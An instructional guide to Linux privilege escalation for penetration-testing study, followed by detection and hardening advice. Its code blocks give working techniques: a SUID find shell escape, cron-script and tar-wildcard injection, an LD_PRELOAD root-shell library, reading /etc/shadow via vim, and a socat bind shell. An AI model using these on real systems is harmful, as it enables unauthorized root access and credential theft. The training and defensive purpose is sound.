# Linux Privilege Escalation

Privilege escalation is the art of turning a foothold into full system control. This guide teaches you to think like both an attacker seeking higher privileges and a defender securing systems against escalation.

---

## Why Privilege Escalation is Critical

### The Reality of Initial Access
When you first compromise a system, you rarely land as root. Instead, you typically get:
- **Limited user account**: Can only access certain files and run specific commands
- **Web application context**: Running as www-data or apache with minimal permissions
- **Service account**: Automated account with restricted access

### The Privilege Gap
This creates a gap between your initial access and your goals:
- **What you need**: Root access to install persistence, access sensitive data, pivot to other systems
- **What you have**: Basic user permissions that can't modify system files or access other users' data
- **The challenge**: Find a path from limited user to administrative control

### Why This Matters for Defense
Understanding escalation helps defenders by:
- **Identifying weak points**: Knowing where attackers look helps secure those areas
- **Detecting attacks**: Recognizing escalation attempts in logs and monitoring
- **Hardening systems**: Removing unnecessary attack vectors before they're exploited

---

## The Escalation Mindset

### Think Like a System Administrator
Privilege escalation succeeds because of administrative convenience:
- **Automation**: Scripts that run with elevated privileges for convenience
- **Shared access**: Files and programs that multiple users need to access
- **Legacy configurations**: Old settings that made sense but created vulnerabilities

### Common Escalation Categories
Understanding the types helps you search systematically:

**Configuration Issues**:
- Misconfigured file permissions
- Overly permissive sudo rules
- Unsafe cron jobs

**Application Vulnerabilities**:
- SUID binaries with flaws
- Services running as root unnecessarily
- Third-party software with known issues

**System Design Flaws**:
- Kernel vulnerabilities
- Privilege inheritance issues
- Race conditions in system calls

---

## Intelligence Gathering - Know Your Environment

### Why Enumeration Comes First
Before attempting any escalation, you need to understand:
- **What's running**: Services, processes, and scheduled tasks
- **Who has access**: Users, groups, and permission structures  
- **What's vulnerable**: Outdated software, misconfigurations, custom applications

### The Systematic Approach
Think of enumeration like a medical examination - check everything systematically:

**System Health Check**:
```bash
# What version of Linux are we dealing with?
uname -a                    # Kernel version (for exploit research)
cat /etc/issue             # Distribution and version
cat /proc/version          # Detailed kernel information
```

**Current Context Assessment**:
```bash
# Who am I and what can I do?
whoami && id               # Current user and group memberships
sudo -l                    # What can I run with sudo?
groups                     # What groups do I belong to?
```

**Environment Intelligence**:
```bash
# What's in my environment that might help?
env                        # Environment variables (passwords, paths)
history                    # Previous commands (credentials, file locations)
cat ~/.bash_history        # Historical commands
```

### Understanding What This Tells You

**From `uname -a`**: 
- Kernel version helps identify known exploits
- Architecture (32/64-bit) affects exploit compatibility
- Build date indicates patch level

**From `id` command**:
- Group memberships reveal potential access (docker, sudo, admin groups)
- UID shows if you're a system account or regular user

**From `sudo -l`**:
- Specific commands you can run as root
- Environment variables that are preserved
- Potential for sudo rule bypasses

---

## User and Process Landscape

### Mapping the Human Element
Users are often the weakest link in security:

**User Discovery Strategy**:
```bash
# Who else is on this system?
cat /etc/passwd | grep -v nologin | grep -v false
# This shows users with actual shell access

# Who's currently active?
w                          # Current sessions
last                       # Recent login history
```

**What This Reveals**:
- **Multiple users**: Potential for lateral movement or credential theft
- **Service accounts**: Often have elevated privileges for applications
- **Admin accounts**: Primary targets for credential harvesting

### Process Intelligence Gathering
Running processes reveal system behavior and potential targets:

**Process Enumeration Logic**:
```bash
# What's running and who owns it?
ps aux                     # All processes with owners
ps -ef --forest           # Process hierarchy (parent-child relationships)
```

**Network Service Discovery**:
```bash
# What services are listening?
netstat -tulpn            # Traditional network status
ss -tulpn                 # Modern alternative, faster and more detailed
```

**What to Look For**:
- **Root processes**: Services running with elevated privileges
- **Custom applications**: Non-standard software that might have vulnerabilities
- **Network services**: Potential attack vectors or escalation paths
- **Process arguments**: Command lines might contain credentials or interesting paths

### Automated vs Manual Enumeration

**When to Use Automated Tools**:
- Time pressure situations
- Comprehensive coverage needed
- Learning what to look for manually

**Manual Enumeration Benefits**:
- Stealthy (no tool signatures)
- Deeper understanding of the system
- Ability to follow interesting leads immediately

---

## SUID/SGID - The Privilege Inheritance Trap

### Understanding the SUID Concept
SUID (Set User ID) is a Unix feature that allows programs to run with their owner's privileges instead of the current user's privileges.

**Why SUID Exists**:
- **Legitimate use**: Programs like `passwd` need root access to modify /etc/shadow
- **Convenience**: Allows users to perform privileged tasks without knowing root password
- **System design**: Part of Unix security model for controlled privilege elevation

### The Security Problem
SUID becomes dangerous when:
- **Unnecessary elevation**: Programs have SUID when they don't need it
- **Vulnerable code**: The SUID program has bugs or features that can be abused
- **Poor design**: Programs execute user input or call other programs unsafely

### Finding SUID Opportunities

**Systematic SUID Discovery**:
```bash
# Find all SUID binaries (the 4 in 4000 is the SUID bit)
find / -perm -4000 -type f 2>/dev/null
```

**What to Look For**:
- **Unusual locations**: SUID binaries in /tmp, /home, or custom directories
- **Unknown programs**: Binaries you don't recognize (custom applications)
- **Standard programs**: Known binaries that might have escape methods

### The GTFOBins Methodology
GTFOBins (Get The F*** Out Binaries) documents how legitimate tools can be abused.

**Why This Works**:
- **Feature abuse**: Using legitimate features in unintended ways
- **Design assumptions**: Programs assume they're used correctly
- **Complex functionality**: More features = more potential abuse vectors

**Example - Understanding the `find` Exploit**:
```bash
# If find has SUID permissions:
find . -exec /bin/bash -p \; -quit
```

**Why this works**:
1. `find` can execute commands via `-exec`
2. `-p` preserves privileges in bash
3. SUID makes the executed bash run as root
4. Legitimate feature used maliciously

### Analyzing Unknown SUID Binaries

When you find unfamiliar SUID programs:

**Static Analysis Approach**:
```bash
# What does this program do?
file /path/to/binary       # Basic file information
strings /path/to/binary    # Embedded strings (paths, commands, errors)
```

**Dynamic Analysis**:
```bash
# How does it behave?
ltrace /path/to/binary     # Library calls (shows function usage)
strace /path/to/binary     # System calls (shows OS interactions)
```

**What to Look For**:
- **System() calls**: Direct command execution
- **Relative paths**: Programs that call other programs without full paths
- **User input**: Programs that process user-supplied data
- **File operations**: Programs that read/write files based on user input

---

## Cron Jobs - The Automated Attack Vector

### Why Cron Jobs are Goldmines
Cron jobs run automatically with specific user privileges, often root. They're attractive because:
- **Scheduled execution**: Attacks trigger automatically
- **High privileges**: Often run as root for system maintenance
- **Less monitoring**: Automated tasks receive less scrutiny
- **Predictable timing**: You know when your attack will execute

### The Cron Attack Surface

**Configuration Vulnerabilities**:
- **Writable script files**: If you can modify the script, you control execution
- **Writable directories**: Scripts in directories you can write to
- **PATH manipulation**: Scripts that call programs without full paths

**Discovery Strategy**:
```bash
# System-wide scheduled tasks
cat /etc/crontab           # Main system cron configuration
ls -la /etc/cron.*         # Hourly, daily, weekly, monthly scripts
cat /etc/cron.d/*          # Additional cron configurations
```

**User-specific tasks**:
```bash
# Current user's cron jobs
crontab -l

# Other users' cron jobs (if readable)
crontab -u username -l
```

### Cron Exploitation Techniques

**Direct Script Modification**:
When a cron script is writable, you can append your payload:
```bash
# If /usr/local/bin/backup.sh runs as root and is writable:
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /usr/local/bin/backup.sh
```

**Why this works**:
1. Cron executes the script as root
2. Your added commands run with root privileges
3. Creates a SUID copy of bash for later use

**PATH Hijacking in Cron**:
When scripts call programs without full paths:
```bash
# If cron runs a script containing: cleanup
# And PATH includes writable directories:
echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > /tmp/cleanup
chmod +x /tmp/cleanup
# Modify PATH or place in existing PATH directory
```

### Advanced Cron Techniques

**Wildcard Injection**:
Some backup scripts use wildcards dangerously:
```bash
# If cron runs: tar -czf backup.tar.gz *
# Create malicious files that abuse tar's command-line parsing:
echo "payload commands" > exploit.sh
chmod +x exploit.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh exploit.sh"
```

**Why this works**:
1. Shell expands `*` to include your specially named files
2. Tar interprets the filenames as command-line options
3. The `--checkpoint-action` option executes your script

### Monitoring for Cron Execution

**Using pspy** (process monitor without root):
```bash
# Download and run pspy to see process execution
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
```

This helps you:
- See what processes run at specific times
- Identify cron jobs that aren't in standard locations
- Understand the timing of automated tasks

---

## Environment Variable Attacks - Controlling Program Behavior

### Understanding PATH Vulnerabilities
The PATH environment variable tells the system where to find programs. When programs are called without full paths, the system searches PATH directories in order.

**The Attack Principle**:
If you can control PATH or write to directories in PATH, you can make programs execute your code instead of the intended program.

### PATH Hijacking Scenarios

**SUID Binary Calling External Programs**:
```bash
# If a SUID binary calls 'ps' without full path (/bin/ps)
# Check what it's calling:
strings /vulnerable/binary | grep -v '^/'

# Create malicious version:
echo "/bin/bash" > /tmp/ps
chmod +x /tmp/ps

# Hijack PATH:
export PATH=/tmp:$PATH

# Execute vulnerable binary:
/vulnerable/binary
```

**Understanding the Attack Flow**:
1. SUID binary runs with elevated privileges
2. Binary calls `ps` without specifying `/bin/ps`
3. System searches PATH directories in order
4. Your `/tmp/ps` is found first and executed
5. Your malicious `ps` runs with the SUID binary's privileges

### LD_PRELOAD - Library Hijacking

**What LD_PRELOAD Does**:
This environment variable forces programs to load specific shared libraries before others, effectively hijacking library functions.

**When This Works**:
- Programs that preserve LD_PRELOAD (some sudo configurations)
- SUID binaries that don't sanitize environment
- Programs run through certain interpreters

**The Attack Technique**:
```bash
# Create malicious shared library:
cat > /tmp/preload.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash");
}
EOF

# Compile the library:
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c

# Use with vulnerable program:
sudo LD_PRELOAD=/tmp/preload.so some_program
```

**Why This Works**:
1. The `_init()` function runs when the library loads
2. `setresuid(0,0,0)` sets real, effective, and saved UIDs to root
3. `system("/bin/bash")` gives you a root shell
4. This happens before the main program executes

---

## Kernel Exploits - Breaking the Foundation

### When to Consider Kernel Exploits
Kernel exploits should be your **last resort** because:
- **System instability**: Can crash the entire system
- **Detection risk**: Often leave traces in system logs
- **Reliability issues**: May not work on all configurations
- **Cleanup difficulty**: Hard to remove traces after execution

### The Kernel Vulnerability Landscape

**Why Kernel Exploits Work**:
- **Kernel privilege**: The kernel runs with ultimate system privileges
- **Complex code**: Millions of lines of code with inevitable bugs
- **Hardware interaction**: Low-level operations are error-prone
- **Backward compatibility**: Old code paths may have vulnerabilities

### Research and Identification Process

**Kernel Version Analysis**:
```bash
# Get detailed kernel information:
uname -r                   # Release version
cat /proc/version          # Compilation details
cat /etc/os-release        # Distribution information
```

**Exploit Research Strategy**:
```bash
# Search exploit databases:
searchsploit linux kernel $(uname -r)
searchsploit ubuntu $(lsb_release -r | cut -f2)
```

**Online Resources**:
- **CVE databases**: Check for recent kernel vulnerabilities
- **Exploit-DB**: Searchable exploit database
- **GitHub**: Often has proof-of-concept exploits
- **Security advisories**: Distribution-specific vulnerability announcements

### Famous Kernel Exploits and Their Impact

**Dirty COW (CVE-2016-5195)**:
- **Vulnerability**: Race condition in memory management
- **Impact**: Reliable privilege escalation on most Linux systems
- **Why it worked**: Fundamental flaw in copy-on-write mechanism
- **Lesson**: Even core kernel features can have subtle bugs

**DirtyCred (CVE-2022-2588)**:
- **Vulnerability**: Use-after-free in netfilter
- **Impact**: Container escape and privilege escalation
- **Modern relevance**: Shows kernel exploitation continues to evolve

### Safe Kernel Exploit Usage

**Before Running Any Kernel Exploit**:
1. **Backup critical data**: Kernel exploits can corrupt filesystems
2. **Test in VMs first**: Understand the exploit's behavior
3. **Check system load**: Don't run on production systems under load
4. **Have recovery plan**: Know how to restore if things go wrong

**Compilation Considerations**:
```bash
# Check system architecture:
uname -m                   # Processor architecture
gcc --version              # Compiler availability

# Many exploits need specific compilation flags:
gcc -o exploit exploit.c -lpthread
```

---

## Living Off the Land - GTFOBins Mastery

### The Philosophy Behind GTFOBins
GTFOBins represents a fundamental security principle: **any feature can become a vulnerability**. The name stands for "Get The F*** Out of jail" Binaries.

**Why Legitimate Tools Make Good Weapons**:
- **Always available**: Standard system tools are always present
- **Trusted by defenders**: Security tools often whitelist system binaries
- **Rich functionality**: Complex programs have many features to abuse
- **Documentation**: Features are well-documented (including abuse potential)

### Understanding Binary Capabilities

**File Operations**:
Programs that can read/write files might bypass access controls:
```bash
# Reading /etc/shadow with vim:
vim /etc/shadow
# Or
vim -c ':r /etc/shadow'
```

**Command Execution**:
Programs that can execute other programs inherit their privileges:
```bash
# Getting shell through awk:
awk 'BEGIN {system("/bin/bash")}'

# Through python:
python -c 'import os; os.system("/bin/bash")'
```

**Network Capabilities**:
Some programs can make network connections, useful for reverse shells:
```bash
# Netcat-like functionality with socat:
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

### The GTFOBins Research Process

**Finding Exploitable Binaries**:
```bash
# What can I execute?
which awk python perl ruby lua node
ls -la /usr/bin | grep rwx

# Cross-reference with GTFOBins website
```

**Testing Techniques**:
1. **Start simple**: Try basic command execution first
2. **Check permissions**: Verify the binary actually works
3. **Understand limitations**: Some techniques work only in specific contexts
4. **Document successes**: Keep track of what works in your environment

### Advanced GTFOBins Techniques

**Chaining Commands**:
Sometimes you need to combine techniques:
```bash
# Use find to execute vim to get shell:
find . -name "*.txt" -exec vim {} \;
# Then within vim: :!/bin/bash
```

**Context-Specific Exploitation**:
- **SUID context**: Focus on privilege-preserving techniques
- **Restricted shell**: Look for shell escape mechanisms
- **Network isolation**: Prioritize local exploitation over reverse shells

---

## Detection and Defense - The Blue Team Perspective

### How Defenders Spot Privilege Escalation

**File Integrity Monitoring**:
- **SUID/SGID changes**: New SUID binaries are major red flags
- **Critical file modifications**: Changes to /etc/passwd, /etc/shadow, sudo configuration
- **Unusual file creation**: Executables in /tmp, /dev/shm, or user directories

**Process Monitoring**:
- **Privilege changes**: Processes that change UID/GID during execution
- **Unusual parent-child relationships**: Shells spawning from unexpected processes
- **Command line analysis**: Suspicious arguments or GTFOBins usage patterns

**Behavioral Analysis**:
- **User activity patterns**: Users accessing files they normally don't touch
- **Time-based anomalies**: Activity during unusual hours
- **Privilege usage**: Sudo usage patterns and failed attempts

### Hardening Against Privilege Escalation

**System Configuration**:
- **Minimize SUID binaries**: Remove unnecessary SUID bits
- **Secure cron jobs**: Use absolute paths, proper permissions
- **Environment sanitization**: Configure sudo to reset environment variables
- **File permissions**: Regular audits of world-writable files and directories

**Monitoring and Detection**:
- **Auditd configuration**: Log file access, process execution, user changes
- **SIEM integration**: Correlate events across multiple systems
- **Baseline establishment**: Know what normal looks like to spot anomalies

**Proactive Security**:
- **Regular updates**: Patch management for kernel and system components
- **Principle of least privilege**: Users and services run with minimum necessary permissions
- **Security scanning**: Regular vulnerability assessments and penetration testing

---

## Building Your Escalation Toolkit

### Essential Tools for Practice
- **LinPEAS**: Automated enumeration script
- **Linux Exploit Suggester**: Kernel vulnerability identification
- **pspy**: Process monitoring without root privileges
- **GTFOBins website**: Reference for binary abuse techniques

### Hands-On Learning Resources

**Vulnerable VMs for Practice**:
- **Lin.Security**: Focuses specifically on Linux privilege escalation
- **VulnHub**: Multiple VMs with escalation challenges
- **TryHackMe**: Guided learning with explanations

**Building Your Own Lab**:
- **Virtual machines**: Safe environment for testing kernel exploits
- **Docker containers**: Practice container escape techniques
- **Custom vulnerabilities**: Create your own escalation scenarios

### The Learning Process

**Start with Enumeration**:
- Master manual enumeration before relying on tools
- Understand what each command tells you about the system
- Practice recognizing unusual configurations

**Progress to Exploitation**:
- Start with simple SUID and sudo misconfigurations
- Gradually work up to more complex techniques
- Always understand why an exploit works, not just how to run it

**Think Like a Defender**:
- For every technique you learn, consider how to detect it
- Understand the legitimate use cases for potentially dangerous configurations
- Practice hardening systems against the techniques you've learned

Remember: Privilege escalation is as much about understanding system administration as it is about exploiting vulnerabilities. The more you understand how systems are supposed to work, the better you'll be at finding where they're broken.

---

## Quick Reference for Practice

### Essential Commands to Master
- **Enumeration**: `find`, `grep`, `ps`, `netstat`, `ls -la`
- **File analysis**: `strings`, `file`, `stat`, `getcap`
- **Process monitoring**: `ps aux`, `pspy`, `lsof`
- **Permission checking**: `sudo -l`, `id`, `groups`

### Key Directories to Investigate
- `/tmp`, `/var/tmp` - World-writable locations
- `/opt`, `/usr/local` - Custom application installations
- `/home/*` - User directories for credential hunting
- `/etc/cron*` - Scheduled task configurations
- `/var/log` - System logs for information gathering

### Common Escalation Indicators
- SUID binaries in unusual locations
- World-writable files in system directories
- Cron jobs running as root with weak permissions
- Services running with unnecessary privileges
- Kernel versions with known exploits

Practice these concepts in controlled environments, always with proper authorization. Understanding privilege escalation makes you both a better attacker and defender.